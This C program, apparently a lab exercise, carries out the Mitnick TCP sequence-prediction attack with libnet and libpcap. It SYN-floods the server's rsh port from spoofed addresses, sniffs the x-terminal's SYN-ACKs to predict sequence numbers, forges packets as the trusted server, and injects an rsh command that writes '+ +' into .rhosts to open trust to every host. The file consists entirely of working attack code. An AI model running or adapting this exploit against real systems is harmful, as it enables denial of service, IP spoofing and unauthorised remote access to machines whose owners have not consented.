#include <stdio.h>
#include <stdlib.h>
#include <libnet.h>
#include <pcap.h>
#include <inttypes.h>



#define kevin "172.16.41.2"
#define server "172.16.41.3"
#define xterminal "172.16.41.4"
#define SIZE_ETHERNET 14

/* IP header */
	struct sniff_ip {
		u_char ip_vhl;		/* version << 4 | header length >> 2 */
		u_char ip_tos;		/* type of service */
		u_short ip_len;		/* total length */
		u_short ip_id;		/* identification */
		u_short ip_off;		/* fragment offset field */
	#define IP_RF 0x8000		/* reserved fragment flag */
	#define IP_DF 0x4000		/* dont fragment flag */
	#define IP_MF 0x2000		/* more fragments flag */
	#define IP_OFFMASK 0x1fff	/* mask for fragmenting bits */
		u_char ip_ttl;		/* time to live */
		u_char ip_p;		/* protocol */
		u_short ip_sum;		/* checksum */
		struct in_addr ip_src,ip_dst; /* source and dest address */
	};
	#define IP_HL(ip)		(((ip)->ip_vhl) & 0x0f)
	#define IP_V(ip)		(((ip)->ip_vhl) >> 4)

	/* TCP header */
	typedef u_int tcp_seq;

	struct sniff_tcp {
		u_short th_sport;	/* source port */
		u_short th_dport;	/* destination port */
		tcp_seq th_seq;		/* sequence number */
		tcp_seq th_ack;		/* acknowledgement number */
		u_char th_offx2;	/* data offset, rsvd */
	#define TH_OFF(th)	(((th)->th_offx2 & 0xf0) >> 4)
		u_char th_flags;
	#define TH_FIN 0x01
	#define TH_SYN 0x02
	#define TH_RST 0x04
	#define TH_PUSH 0x08
	#define TH_ACK 0x10
	#define TH_URG 0x20
	#define TH_ECE 0x40
	#define TH_CWR 0x80
	#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
		u_short th_win;		/* window */
		u_short th_sum;		/* checksum */
		u_short th_urp;		/* urgent pointer */
};



void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

libnet_t *l=NULL;	
char errbuf[LIBNET_ERRBUF_SIZE];
libnet_ptag_t tcp = 0;    /* libnet protocol block */
libnet_ptag_t ipv4 = 0;    /* libnet protocol block */
uint16_t my_port = 1000;
uint16_t server_port = 513;
uint16_t xterminal_port = 514;
pcap_t *handle;
uint64_t first_syn_ack ,store_syn_server, last_ack,prev_ack,second_syn_ack,third_syn_ack,standart,next_ack;
uint64_t syn_ack[3];
u_int32_t xterminal_ip,server_ip,my_ip;
int difference = 1;
int packet_num_to_send = 0;
struct pcap_pkthdr header;
const u_char *packet;
void DDOS_attack(){
    int c;
    int i =0;
    int build_ip = 1;
    char disable[7] = {'d','i','s','a','b','l','e'};
	
	l = libnet_init(LIBNET_RAW4, NULL, errbuf);

	if (l == NULL) {
		fprintf(stderr, "libnet_init() failed: %s", errbuf);
		exit(0);
	}

    if((int)(server_ip = libnet_name2addr4(l,server,LIBNET_DONT_RESOLVE))==-1){
        fprintf(stderr, "Destination IP address could not be resolved: 172.16.41.3n");
		exit(0);
    }

    // create new package
    tcp = LIBNET_PTAG_INITIALIZER;

    for( i = 0;i<10;i++){
        tcp = libnet_build_tcp(
            (uint16_t)libnet_get_prand(LIBNET_PRu16),    // src port  //VALEEEEEEE 1000 
            server_port,    // destination port 
            libnet_get_prand(LIBNET_PRu32), // acknowledgement 
            libnet_get_prand(LIBNET_PRu32), //sequence number 
            TH_SYN, // control flags 
            libnet_get_prand(LIBNET_PRu16), //window size 
            0, //checksum - 0 = autofill 
            0, // urgent 
            LIBNET_TCP_H, // header length 
            (u_int8_t *) disable, // payload 
            7, // payload length 
            l, // libnet context 
            tcp // PTAG 
        );
        if(build_ip){
            build_ip = 0;
            ipv4 = libnet_build_ipv4 (LIBNET_TCP_H + LIBNET_IPV4_H,    // length 
                        0,    // TOS 
                        libnet_get_prand (LIBNET_PRu16),    // IP ID 
                        0,    // frag offset 
                        libnet_get_prand(LIBNET_PR8),    // TTL 
                        IPPROTO_TCP,    // upper layer protocol 
                        0,    // checksum, 0=autofill 
                        libnet_get_prand(LIBNET_PRu32),    // src IP 
                        server_ip,    // dest IP 
                        NULL,    // payload 
                        0,    // payload len 
                        l,    // libnet context 
                        0);    //protocol tag 

            if (ipv4 == -1)
            {
                fprintf (stderr,
                "Unable to build IPv4 header: %s\n", libnet_geterror (l));
                exit (1);
            }
        }

    c = libnet_write(l);
    if (c == -1) {
			fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
		}
    }
    libnet_destroy(l);
}


void find_seq_xterminal(){
    int c;
    int i = 0;
    int build_ip = 1;
   
    //u_int32_t my_ip;
    char *dev, errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char filter_exp[] = "src 172.16.41.4";	// The filter expression 
	bpf_u_int32 mask;		// The netmask of our sniffing device 
	bpf_u_int32 net;		// The IP of our sniffing device 

	l = libnet_init(LIBNET_RAW4, NULL, errbuf);

	if (l == NULL) {
		fprintf(stderr, "libnet_init() failed: %s", errbuf);
		exit(0);
	}

    dev = pcap_lookupdev(errbuf);
	if (dev == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		exit(0);
	}
    
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		 fprintf(stderr, "Can't get netmask for device %s\n", dev);
		 net = 0;
		 mask = 0;
	}

    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		 fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		 exit(0);
	}

    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		 exit(0);
	}

	if (pcap_setfilter(handle, &fp) == -1) {
		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		 exit(0);
	}

    if((int)(xterminal_ip = libnet_name2addr4(l,xterminal,LIBNET_DONT_RESOLVE))==-1){
        fprintf(stderr, "Destination IP address could not be resolved: 172.16.41.4\n");
		exit(0);
    }

    if((int)(my_ip = libnet_name2addr4(l,kevin,LIBNET_DONT_RESOLVE))==-1){
        fprintf(stderr, "MY IP address could not be resolved: 172.16.41.2\n");
		exit(0);
    }
   
    // create new package
    tcp = LIBNET_PTAG_INITIALIZER;
      for(i=0;i<3;i++){
		  //while(difference>0 ){
        tcp = libnet_build_tcp(
            my_port++,    // src port  //VALEEEEEEE 1000 
            xterminal_port,    // destination port 
            libnet_get_prand(LIBNET_PRu32), // acknowledgement 
            libnet_get_prand(LIBNET_PRu32), // sequence number 
            TH_SYN, // control flags 
            libnet_get_prand(LIBNET_PRu16), // window size 
            0, // checksum - 0 = autofill 
            0, // urgent 
            LIBNET_TCP_H, // header length 
            NULL, // payload 
            0, // payload length 
            l, // libnet context 
            tcp // PTAG 
        );
        if(build_ip){
            build_ip = 0;
            ipv4 = libnet_build_ipv4 (LIBNET_TCP_H + LIBNET_IPV4_H,    // length 
                        0,    // TOS 
                        libnet_get_prand (LIBNET_PRu16),    // IP ID 
                        0,    // frag offset 
                        libnet_get_prand(LIBNET_PR8),    // TTL 
                        IPPROTO_TCP,    // upper layer protocol 
                        0,    // checksum, 0=autofill 
                        my_ip,    // src IP 
                        xterminal_ip,    // dest IP 
                        NULL,    // payload 
                        0,    // payload len 
                        l,    // libnet context 
                        0);    // protocol tag 

            if (ipv4 == -1)
            {
                fprintf (stderr,
                "Unable to build IPv4 header: %s\n", libnet_geterror (l));
                exit (1);
            }
        }
        

    c = libnet_write(l);
    if (c == -1) {
			fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
		}
    }

    pcap_loop(handle, 3, got_packet, NULL);
    pcap_freecode(&fp);
	pcap_close(handle);

    for(i=0;i<3;i++){
		printf("seq %"PRIu64"\n",syn_ack[i]);
    }

    standart = (syn_ack[2]-syn_ack[1]) -(syn_ack[1] - syn_ack[0]);

    //printf("difference %"PRIu32"\n",difference);
	last_ack = syn_ack[2];
	next_ack = syn_ack[2];
	prev_ack = syn_ack[1];
	
	while(last_ack < 4294967296 ){
		last_ack = next_ack + (next_ack - prev_ack) + standart;
		prev_ack = next_ack;
		next_ack = last_ack;
		packet_num_to_send++;
		printf("next : %"PRIu64 "\n", next_ack);
	}
	printf("package_to_send = %d\n",packet_num_to_send);
	printf("Turn around : %"PRIu32"\n",(uint32_t)next_ack);

	build_ip = 1;
	tcp = LIBNET_PTAG_INITIALIZER;
      for(i=0;i<packet_num_to_send-1;i++){
		  //while(difference>0 ){
        tcp = libnet_build_tcp(
            my_port++,    // src port  //VALEEEEEEE 1000 
            xterminal_port,    // destination port 
            libnet_get_prand(LIBNET_PRu32), // acknowledgement 
            libnet_get_prand(LIBNET_PRu32), // sequence number 
            TH_SYN, // control flags 
            libnet_get_prand(LIBNET_PRu16), // window size 
            0, // checksum - 0 = autofill 
            0, // urgent 
            LIBNET_TCP_H, // header length 
            NULL, // payload 
            0, // payload length 
            l, // libnet context 
            tcp // PTAG 
        );
        if(build_ip){
            build_ip = 0;
            ipv4 = libnet_build_ipv4 (LIBNET_TCP_H + LIBNET_IPV4_H,    // length 
                        0,    // TOS 
                        libnet_get_prand (LIBNET_PRu16),    // IP ID 
                        0,    // frag offset 
                        libnet_get_prand(LIBNET_PR8),    // TTL 
                        IPPROTO_TCP,    // upper layer protocol 
                        0,    // checksum, 0=autofill 
                        my_ip,    // src IP 
                        xterminal_ip,    // dest IP 
                        NULL,    // payload 
                        0,    // payload len 
                        l,    // libnet context 
                        0);    // protocol tag 

            if (ipv4 == -1)
            {
                fprintf (stderr,
                "Unable to build IPv4 header: %s\n", libnet_geterror (l));
                exit (1);
            }
        }
        

    c = libnet_write(l);
    if (c == -1) {
			fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
		}
    }
    libnet_destroy(l);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
	(void) args;
	(void) header;
	//(void) packet; 
    static int count = 1;                   
    static int count1 = 0;                    
	const struct sniff_ip *ip;              
	const struct sniff_tcp *tcp;            
	int size_ip;
	int size_tcp;

	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}

    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
	size_tcp = TH_OFF(tcp)*4;
	if (size_tcp < 20) {
		printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
		return;
	}
   	//printf("IP :  %"PRIu32 "\n",ip->ip_src.s_addr);

    if((ip->ip_src.s_addr) == xterminal_ip ){
   		// printf("xterminal %"PRIu32 " == %"PRIu32 "asd : %"PRIu32 "\n",ip->ip_src.s_addr,xterminal_ip,ip->ip_src);
		//difference = first_syn_ack - ntohl(tcp->th_seq);
        syn_ack[count1++] = ntohl(tcp->th_seq);
    }
    
	count++;
    return;

}

void spoof_server(){

    int c;

	l = libnet_init(LIBNET_RAW4, NULL, errbuf);

	if (l == NULL) {
		fprintf(stderr, "libnet_init() failed: %s", errbuf);
		exit(0);
	}


    if((int)(server_ip = libnet_name2addr4(l,"172.16.41.3",LIBNET_DONT_RESOLVE))==-1){
        fprintf(stderr, "Destination IP address could not be resolved: 172.16.41.3n");
		exit(0);
    }

    if((int)(xterminal_ip = libnet_name2addr4(l,"172.16.41.4",LIBNET_DONT_RESOLVE))==-1){
        fprintf(stderr, "Destination IP address could not be resolved: 172.16.41.4\n");
		exit(0);
    }

    tcp = LIBNET_PTAG_INITIALIZER;

    tcp =  libnet_build_tcp(
	        server_port,                	
	        xterminal_port,                
	        0, 	
	        0, 								
	        TH_SYN,                         
	        libnet_get_prand(LIBNET_PRu16), 							
	        0,                              
	        0,                              
	        LIBNET_TCP_H,
	        NULL,      						
	        0,                     			
	        l,                              
	        tcp                              
	    );
        
    ipv4 =  libnet_build_ipv4(
		LIBNET_TCP_H + LIBNET_IPV4_H,0,libnet_get_prand(LIBNET_PRu16),0,                              
		libnet_get_prand(LIBNET_PR8),IPPROTO_TCP,0,server_ip,xterminal_ip,                  
		NULL,0,l,0                               
		);

    if (ipv4 == -1){
        fprintf (stderr,
        "Unable to build IPv4 header: %s\n", libnet_geterror (l));
         exit (1);
    }

    c = libnet_write(l);

	if (c == -1) {
		fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
	}    

    libnet_destroy(l);

	l = libnet_init(LIBNET_RAW4, NULL, errbuf);

	if (l == NULL) {

		fprintf(stderr, "libnet_init() failed: %s", errbuf);
		exit(0);
	}

	sleep(1);

	tcp = LIBNET_PTAG_INITIALIZER;
	tcp =  libnet_build_tcp(
	    server_port,                	
	    xterminal_port,                 
	    1, 	       
	    (uint32_t)next_ack+1, 					
	    TH_ACK,                         
	    libnet_get_prand(LIBNET_PRu16), 							
	    0,                              
	    0,                              
	    LIBNET_TCP_H,
	    NULL,      						
	    0,                     			
	    l,                              
	    tcp                             
	    );
		ipv4 =  libnet_build_ipv4(
		    LIBNET_TCP_H + LIBNET_IPV4_H,0,libnet_get_prand(LIBNET_PRu16),0,                              
		    libnet_get_prand(LIBNET_PR8),IPPROTO_TCP,0,server_ip,xterminal_ip,                  
		    NULL,0,l,0                               
		);
        if (ipv4 == -1){
            fprintf (stderr,
            "Unable to build IPv4 header: %s\n", libnet_geterror (l));
            exit (1);
        }

	c = libnet_write(l);
	    if (c == -1) {
		    fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
	    }   
    libnet_destroy(l);


}



void send_ack(){
    int c;
    char *payload1 = "0\0tsutomu\0tsutomu\0echo + + >> .rhosts\0";
	l = libnet_init(LIBNET_RAW4, NULL, errbuf);

	if (l == NULL) {
		fprintf(stderr, "libnet_init() failed: %s", errbuf);
		exit(0);
	}

    if((int)(server_ip = libnet_name2addr4(l,"172.16.41.3",LIBNET_DONT_RESOLVE))==-1){
        fprintf(stderr, "Destination IP address could not be resolved: 172.16.41.3\n");
		exit(0);
    }

    if((int)(xterminal_ip = libnet_name2addr4(l,"172.16.41.4",LIBNET_DONT_RESOLVE))==-1){
        fprintf(stderr, "Destination IP address could not be resolved: 172.16.41.4\n");
		exit(0);
    }

   	l = libnet_init(LIBNET_RAW4, NULL, errbuf);

	if (l == NULL) {
		fprintf(stderr, "libnet_init() failed: %s", errbuf);
		exit(0);
	}
	tcp = LIBNET_PTAG_INITIALIZER;
	tcp = libnet_build_tcp(
		    server_port,                		
		    xterminal_port,                    
		    1,				
		    (uint32_t)next_ack + 1,					
		    TH_PUSH + TH_ACK,	                         	
		    libnet_get_prand(LIBNET_PRu16), 								
		    0,                              	
		    0,                              	
		    LIBNET_TCP_H +39,
		    (u_int8_t *)payload1,				
		    39,			   						
		    l,                              	
		    tcp                              	
		    );
            
		
		libnet_build_ipv4(
			LIBNET_TCP_H + LIBNET_IPV4_H +39,	
			0,                                  
			libnet_get_prand(LIBNET_PRu16),     
			0,                                 
			libnet_get_prand(LIBNET_PR8),      
			IPPROTO_TCP,                        
			0,                                  
			server_ip,   						
			xterminal_ip,                           
			NULL,                              
			0,                                
			l,                                
			0                                  
			);
		
	c = libnet_write(l);


	if (c == -1) {
		fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
	}
    libnet_destroy(l);


  /*  l = libnet_init(LIBNET_RAW4, NULL, errbuf);

	if (l == NULL) {
		fprintf(stderr, "libnet_init() failed: %s", errbuf);
		exit(0);
	}
	tcp = LIBNET_PTAG_INITIALIZER;
		

	tcp = libnet_build_tcp(
		    server_port,                		
		    xterminal_port,                    	
		    3,									
		    next_ack + 1,					    
		    TH_PUSH | TH_ACK,	                         	
		    libnet_get_prand(LIBNET_PRu16), 								
		    0,                              
		    0,                              	
		    LIBNET_TCP_H+36,
		    (u_int8_t *)payload,				
		    36,			   						
		    l,                              	
		    tcp                               	
		    );
		
			libnet_build_ipv4(
			    LIBNET_TCP_H + LIBNET_IPV4_H +36,
			    0,                                 
			    libnet_get_prand(LIBNET_PRu16),     
			    0,                                  
			    libnet_get_prand(LIBNET_PR8),       
			    IPPROTO_TCP,                        
			    0,                                  
			    server_ip,   						
			    xterminal_ip,                           
			    NULL,                               
			    0,                                  
			    l,                                
			    0                                  
			);
		
		c = libnet_write(l);

		if (c == -1) {
			fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
		}
    libnet_destroy(l);
*/

}

void enable_server(){
    int c;
    u_int32_t server_ip;
	l = libnet_init(LIBNET_RAW4, NULL, errbuf);

	if (l == NULL) {
		fprintf(stderr, "libnet_init() failed: %s", errbuf);
		exit(0);
	}


    char enable[6] = {'e','n','a','b','l','e'};
    if((int)(server_ip = libnet_name2addr4(l,"172.16.41.3",LIBNET_DONT_RESOLVE))==-1){
        fprintf(stderr, "Destination IP address could not be resolved: 172.16.41.3n");
		exit(0);
    }
    // create new package
    tcp = LIBNET_PTAG_INITIALIZER;

    

    
        tcp = libnet_build_tcp(
            libnet_get_prand (LIBNET_PRu16),    // src port 
            513,    // destination port 
            libnet_get_prand(LIBNET_PRu32), // acknowledgement 
            libnet_get_prand(LIBNET_PRu32), // sequence number 
            TH_SYN, // control flags 
            libnet_get_prand(LIBNET_PRu16), // window size 
            0, // checksum - 0 = autofill 
            0, // urgent 
            LIBNET_TCP_H, // header length 
            (u_int8_t *) enable, // payload 
            6, // payload length 
            l, // libnet context 
            tcp // PTAG 
        );
        
            ipv4 = libnet_build_ipv4 (LIBNET_TCP_H + LIBNET_IPV4_H,    // length 
                        0,    // TOS 
                        libnet_get_prand (LIBNET_PRu16),    //IP ID 
                        0,    // frag offset 
                        libnet_get_prand(LIBNET_PR8),    // TTL 
                        IPPROTO_TCP,    // upper layer protocol 
                        0,    // checksum, 0=autofill 
                        libnet_get_prand(LIBNET_PRu32),    // src IP 
                        server_ip,    // dest IP 
                        NULL,    // payload 
                        0,    // payload len 
                        l,    // libnet context 
                        0);    // protocol tag 

        if (ipv4 == -1)
        {
            fprintf (stderr,
            "Unable to build IPv4 header: %s\n", libnet_geterror (l));
            exit (1);
        }
        

    c = libnet_write(l);
    if (c == -1) {
			fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
		}
		
    
}

int main(){
    //enable_server();
    DDOS_attack();
    find_seq_xterminal();
    spoof_server();
    send_ack();

    return 0;
}

